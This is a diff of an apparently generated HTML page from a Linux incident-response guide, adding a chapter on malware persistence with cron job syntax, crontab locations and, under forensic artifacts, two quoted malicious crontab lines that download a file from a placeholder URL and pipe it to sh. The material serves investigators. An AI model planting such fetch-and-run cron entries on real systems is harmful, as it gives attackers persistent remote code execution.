@@ -84,7 +84,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Introduction</a></li><li class="chapter-item expanded affix "><a href="recommended_reading.html">Recommended Reading</a></li><li class="chapter-item expanded affix "><a href="incident_handling.html">Incident Handling</a></li><li class="chapter-item expanded "><a href="os_accounts.html"><strong aria-hidden="true">1.</strong> User Accounts</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os_accounts_local.html"><strong aria-hidden="true">1.1.</strong> Local User Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_ad.html"><strong aria-hidden="true">1.2.</strong> Active Directory Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_forensics.html"><strong aria-hidden="true">1.3.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="lateral_movement.html"><strong aria-hidden="true">2.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="persistence.html"><strong aria-hidden="true">3.</strong> Persistence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="persistence_autoruns.html"><strong aria-hidden="true">3.1.</strong> Autoruns</a></li><li class="chapter-item expanded "><a href="persistence_triggered_task.html"><strong aria-hidden="true">3.2.</strong> Triggered Tasks</a></li></ol></li><li class="chapter-item expanded "><a href="execution.html"><strong aria-hidden="true">4.</strong> Execution</a></li><li class="chapter-item expanded "><a href="network.html"><strong aria-hidden="true">5.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="webhistory.html"><strong aria-hidden="true">5.1.</strong> Web History</a></li><li class="chapter-item expanded "><a href="open_ports.html"><strong aria-hidden="true">5.2.</strong> Open Ports</a></li><li class="chapter-item expanded "><a href="active_connections.html"><strong aria-hidden="true">5.3.</strong> Active Connections</a></li><li class="chapter-item expanded "><a href="dns_cache.html"><strong aria-hidden="true">5.4.</strong> DNS Cache records</a></li></ol></li><li class="chapter-item expanded "><a href="exfiltration.html"><strong aria-hidden="true">6.</strong> Data Exfiltration</a></li><li class="chapter-item expanded "><a href="config.html"><strong aria-hidden="true">7.</strong> System Configuration</a></li><li class="chapter-item expanded "><a href="applications.html"><strong aria-hidden="true">8.</strong> Installed Applications</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Introduction</a></li><li class="chapter-item expanded affix "><a href="recommended_reading.html">Recommended Reading</a></li><li class="chapter-item expanded affix "><a href="incident_handling.html">Incident Handling</a></li><li class="chapter-item expanded "><a href="os_accounts.html"><strong aria-hidden="true">1.</strong> User Accounts</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os_accounts_local.html"><strong aria-hidden="true">1.1.</strong> Local User Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_ad.html"><strong aria-hidden="true">1.2.</strong> Active Directory Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_forensics.html"><strong aria-hidden="true">1.3.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="lateral_movement.html"><strong aria-hidden="true">2.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="persistence.html"><strong aria-hidden="true">3.</strong> Persistence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="persistence_cron.html"><strong aria-hidden="true">3.1.</strong> Cron Jobs</a></li><li class="chapter-item expanded "><a href="persistence_systemd.html"><strong aria-hidden="true">3.2.</strong> Systemd Services</a></li><li class="chapter-item expanded "><a href="persistence_scripts.html"><strong aria-hidden="true">3.3.</strong> Scripts</a></li><li class="chapter-item expanded "><a href="persistence_forensics.html"><strong aria-hidden="true">3.4.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="execution.html"><strong aria-hidden="true">4.</strong> Execution</a></li><li class="chapter-item expanded "><a href="network.html"><strong aria-hidden="true">5.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="webhistory.html"><strong aria-hidden="true">5.1.</strong> Web History</a></li><li class="chapter-item expanded "><a href="open_ports.html"><strong aria-hidden="true">5.2.</strong> Open Ports</a></li><li class="chapter-item expanded "><a href="active_connections.html"><strong aria-hidden="true">5.3.</strong> Active Connections</a></li><li class="chapter-item expanded "><a href="dns_cache.html"><strong aria-hidden="true">5.4.</strong> DNS Cache records</a></li></ol></li><li class="chapter-item expanded "><a href="exfiltration.html"><strong aria-hidden="true">6.</strong> Data Exfiltration</a></li><li class="chapter-item expanded "><a href="config.html"><strong aria-hidden="true">7.</strong> System Configuration</a></li><li class="chapter-item expanded "><a href="applications.html"><strong aria-hidden="true">8.</strong> Installed Applications</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -619,8 +619,66 @@ distinguishedName: name=nate@corp.tuxtriage.net,cn=users,cn=corp.tuxtriage.net
 <div class="footnote-definition" id="ldb"><sup class="footnote-definition-label">1</sup>
 <p>https://linux.die.net/man/3/ldb </p>
 </div>
-<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="autoruns"><a class="header" href="#autoruns">Autoruns</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="triggered-tasks"><a class="header" href="#triggered-tasks">Triggered Tasks</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="persistence"><a class="header" href="#persistence">Persistence</a></h1>
+<p>Malware persistence is a technique used by malware to ensure that it remains on a system even after it has been rebooted or the user has logged off. This allows the malware to continue to run and execute its malicious code. Malware persistence is a critical part of many malware attacks. Without persistence, the malware would be easily removed by the user or by security software.</p>
+<p>Malware persistence on Linux systems is achieved through a variety of methods, including:</p>
+<ul>
+<li>
+<p><strong>Cron Jobs</strong>: Malware often manipulates cron, the Linux task scheduler, to execute malicious tasks periodically, thus maintaining persistence.</p>
+</li>
+<li>
+<p><strong>Systemd Services</strong>: Linux's system and service manager, systemd, can also be abused by malware to initiate malicious processes at system startup, ensuring malware persistence.</p>
+</li>
+<li>
+<p><strong>Script Modification</strong>: Malware can insert malicious code into commonly executed scripts, such as .bashrc or .bash_profile. Each time the script runs, so does the malware.</p>
+</li>
+<li>
+<p><strong>Kernel Module Manipulation</strong>: Malware with root access can insert malicious kernel modules, enabling it to operate at a low level, beyond the reach of many security measures.</p>
+</li>
+<li>
+<p><strong>Process Injection</strong>: Malware injects its code into a running process, allowing them to gain unauthorized access, manipulate process's behavior, or hide their presense. In addition to this, malware can gain persistence by running everytime the legitimate process runs. </p>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cron-jobs"><a class="header" href="#cron-jobs">Cron Jobs</a></h1>
+<p>Cron is a time-based job scheduler in *nix operating systems. It allows users to schedule commands or scripts to run at specific times or intervals. Cron jobs are often used to automate tasks, such as backups, file maintenance, and software updates. Unfortunately, it can also be leveraged by malicious actors for malware persistence. </p>
+<p>There are two executables of note.
+<code>crond</code> - this is the deamon program that run in the background and is responsible for executing the cron jobs. <code>crond</code> reads the <code>crontab</code> (cron table) file. The execution schedule is defined in a simple text format and contains the following. </p>
+<ul>
+<li>The time or interval at which the job should run</li>
+<li>The command or script that should be run</li>
+<li>The user that should run the job</li>
+</ul>
+<p>These files can be system-wide or user specific. </p>
+<h2 id="crontab-file-format"><a class="header" href="#crontab-file-format">Crontab File format</a></h2>
+<p>A cron job is defined by a single line in a crontab file, structured as follows: </p>
+<pre><code class="language-bash">
+* * * * * command-to-be-executed
+- - - - -
+| | | | |
+| | | | ----- Day of the week (0 - 7) (Sunday = 0 or 7)
+| | | ------- Month (1 - 12)
+| | --------- Day of the month (1 - 31)
+| ----------- Hour (0 - 23)
+------------- Minute (0 - 59)
+</code></pre>
+<p>Each field can contain a single number, a comma-separated list of numbers, a range of numbers, or an asterisk (representing all possible numbers).</p>
+<p>The second executable is <code>crontab</code> which is used to manage the crontab files. <code>crontab -e</code> can be used to edit the crontab file. </p>
+<h3 id="managing-crontab-entries"><a class="header" href="#managing-crontab-entries">Managing crontab entries:</a></h3>
+<ul>
+<li><code>crontab -l</code> lists the current user's crontab entries.</li>
+<li><code>crontab -e</code> opens the user's crontab file for editing.</li>
+<li><code>crontab -r</code> removes the user's crontab file.</li>
+</ul>
+<h2 id="crontab-file-locations"><a class="header" href="#crontab-file-locations">Crontab file locations</a></h2>
+<p>The crontab files for individual users are stored in the /var/spool/cron directory. Each user's crontab file has the same name as the username.</p>
+<p>For example, if the username is <code>cbeard</code> the crontab file for that user would be located at <code>/var/spool/cron/cbeard</code>.</p>
+<p>Additionally, system-wide cron jobs are stored in the <code>/etc/crontab</code> file. The <code>/etc/cron.d/</code> directory is also used to store system-wide cron files, where each file represents a separate cron job.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="systemd-services"><a class="header" href="#systemd-services">Systemd Services</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="scripts"><a class="header" href="#scripts">Scripts</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="forensic-artifacts-1"><a class="header" href="#forensic-artifacts-1">Forensic Artifacts</a></h1>
+<p>https://sandflysecurity.com/blog/linux-malware-persistence-with-cron/ </p>
+<p>*/11 * * * * wget -O - -q http://&lt;malicious_url&gt;/pics/logo.jpg|sh</p>
+<p>*/5 * * * * curl http://&lt;malicious_url&gt;/malicious.png -k|dd skip=2446 bs=1|sh</p>
 <div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="system-configuration"><a class="header" href="#system-configuration">System Configuration</a></h1>
 <h2 id="file-system"><a class="header" href="#file-system">File System</a></h2>
 <h3 id="using-lsblk"><a class="header" href="#using-lsblk">Using lsblk</a></h3>
